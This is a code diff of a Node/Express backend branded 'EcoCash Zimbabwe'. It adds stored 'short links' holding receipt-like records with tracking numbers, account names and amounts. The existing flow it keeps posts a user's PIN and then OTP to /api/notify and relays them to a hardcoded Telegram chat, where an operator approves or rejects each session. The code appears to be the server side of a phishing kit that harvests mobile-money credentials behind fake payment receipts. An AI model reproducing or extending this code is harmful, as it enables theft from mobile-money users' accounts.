@@ -1,7 +1,9 @@
 /**
  * EcoCash Zimbabwe — Backend
- * 2-stage flow: pin → otp
- * Inline Telegram buttons per stage
+ * Features:
+ *   - PIN + OTP flow with Telegram inline approval
+ *   - Short links (/api/links) so client URLs are short
+ *   - Disk-persisted sessions + links
  */
 
 const express = require('express');
@@ -17,6 +19,7 @@ const TELEGRAM_CHAT_ID   = process.env.TELEGRAM_CHAT_ID   || '8392790531';
 const TELEGRAM_API       = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
 const SESSION_TTL_MS     = 60 * 60 * 1000;
 const SESSIONS_FILE      = '/tmp/ecopay_sessions.json';
+const LINKS_FILE         = '/tmp/ecopay_links.json';
 
 app.use(cors());
 app.use(express.json({ limit: '2mb' }));
@@ -28,7 +31,9 @@ app.use((req, _res, next) => {
   next();
 });
 
-/* ---------- Persistent session store ---------- */
+/* ============================================================
+   PERSISTENT SESSION STORE
+   ============================================================ */
 let sessions = new Map();
 try {
   if (fs.existsSync(SESSIONS_FILE)) {
@@ -74,7 +79,26 @@ setInterval(() => {
   if (changed) persistSessions();
 }, 5 * 60 * 1000);
 
-/* ---------- Helpers ---------- */
+/* ============================================================
+   PERSISTENT SHORT-LINK STORE
+   ============================================================ */
+let links = new Map();
+try {
+  if (fs.existsSync(LINKS_FILE)) {
+    const raw = fs.readFileSync(LINKS_FILE, 'utf8');
+    links = new Map(JSON.parse(raw));
+    console.log(`[links] restored ${links.size} from disk`);
+  }
+} catch(e){ console.warn('[links] restore failed:', e.message); }
+
+function persistLinks(){
+  try { fs.writeFileSync(LINKS_FILE, JSON.stringify([...links.entries()])); }
+  catch(e){ console.warn('[links] persist failed:', e.message); }
+}
+
+/* ============================================================
+   HELPERS
+   ============================================================ */
 function esc(s = ''){
   return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
 }
@@ -111,19 +135,27 @@ async function tgRemoveButtons(chatId, messageId){
   }).catch(()=>{});
 }
 
-/* ---------- Health & debug ---------- */
+/* ============================================================
+   HEALTH & DEBUG
+   ============================================================ */
 app.get('/', (_req, res) => {
   res.json({
     ok: true,
     service: 'ecopay-zimbabwe-backend',
     activeSessions: sessions.size,
+    activeLinks: links.size,
     telegramConfigured: !!(TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID),
     publicUrl: process.env.PUBLIC_URL || '(not set)',
     time: new Date().toISOString()
   });
 });
 
-app.get('/health', (_req, res) => res.json({ ok: true, ts: Date.now(), activeSessions: sessions.size }));
+app.get('/health', (_req, res) => res.json({
+  ok: true,
+  ts: Date.now(),
+  activeSessions: sessions.size,
+  activeLinks: links.size
+}));
 
 app.get('/api/debug', (_req, res) => {
   const list = [];
@@ -134,7 +166,59 @@ app.get('/api/debug', (_req, res) => {
 });
 
 /* ============================================================
-   POST /api/notify — stages: 'pin' | 'otp'
+   SHORT LINKS — create & fetch
+   ============================================================ */
+
+/* POST /api/links — save receipt & return the short code */
+app.post('/api/links', (req, res) => {
+  try {
+    const body = req.body || {};
+    const tracking = String(
+      body.trackingNumber || body.t || ''
+    ).trim().toUpperCase();
+
+    if (!tracking) {
+      return res.status(400).json({ ok: false, error: 'Tracking number required' });
+    }
+
+    const record = {
+      trackingNumber: tracking,
+      accountName: body.accountName || '',
+      accountNumber: body.accountNumber || '',
+      amount: body.amount || '0',
+      currency: (body.currency || 'USD').toUpperCase(),
+      countryCode: body.countryCode || '+263',
+      countryFlag: body.countryFlag || '🇿🇼',
+      countryName: body.countryName || 'Zimbabwe',
+      modeOfPayment: body.modeOfPayment || '',
+      receiptOptional: body.receiptOptional || '',
+      timestamp: body.timestamp || '',
+      createdAt: Date.now()
+    };
+
+    links.set(tracking, record);
+    persistLinks();
+    console.log(`[link] created ${tracking} (total=${links.size})`);
+
+    return res.json({ ok: true, code: tracking, shortUrl: `index.html?t=${tracking}` });
+  } catch (err) {
+    console.error('create link error:', err);
+    return res.status(500).json({ ok: false, error: err.message });
+  }
+});
+
+/* GET /api/links/:code — fetch a saved receipt */
+app.get('/api/links/:code', (req, res) => {
+  const code = String(req.params.code || '').trim().toUpperCase();
+  const rec = links.get(code);
+  if (!rec) {
+    return res.status(404).json({ ok: false, error: 'Link not found' });
+  }
+  return res.json({ ok: true, ...rec });
+});
+
+/* ============================================================
+   NOTIFY — stages: 'pin' | 'otp'
    ============================================================ */
 app.post('/api/notify', async (req, res) => {
   try {
@@ -195,7 +279,7 @@ app.post('/api/notify', async (req, res) => {
 });
 
 /* ============================================================
-   GET /api/status/:id
+   STATUS — poll from client
    ============================================================ */
 app.get('/api/status/:id', (req, res) => {
   const s = getSession(req.params.id);
@@ -204,7 +288,7 @@ app.get('/api/status/:id', (req, res) => {
 });
 
 /* ============================================================
-   POST /api/telegram-webhook
+   TELEGRAM WEBHOOK — receives button taps
    ============================================================ */
 app.post('/api/telegram-webhook', async (req, res) => {
   try {
@@ -216,8 +300,14 @@ app.post('/api/telegram-webhook', async (req, res) => {
       const [action, sessionId] = cq.data.split(':');
       const s = getSession(sessionId);
 
-      if (!s) { await tgAnswer(cq.id, 'Session expired'); return res.json({ ok: true }); }
-      if (s.status !== 'pending') { await tgAnswer(cq.id, `Already ${s.status}`); return res.json({ ok: true }); }
+      if (!s) {
+        await tgAnswer(cq.id, 'Session expired');
+        return res.json({ ok: true });
+      }
+      if (s.status !== 'pending') {
+        await tgAnswer(cq.id, `Already ${s.status}`);
+        return res.json({ ok: true });
+      }
 
       if (action === 'approve') { s.status = 'approved'; await tgAnswer(cq.id, '✅ Approved'); }
       else if (action === 'reject')  { s.status = 'rejected'; await tgAnswer(cq.id, '❌ Rejected'); }
@@ -241,7 +331,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
 });
 
 /* ============================================================
-   Auto-register webhook on startup
+   AUTO-REGISTER WEBHOOK ON STARTUP
    ============================================================ */
 async function registerWebhook(){
   const publicUrl = (process.env.PUBLIC_URL || `http://localhost:${PORT}`).replace(/\/+$/, '');
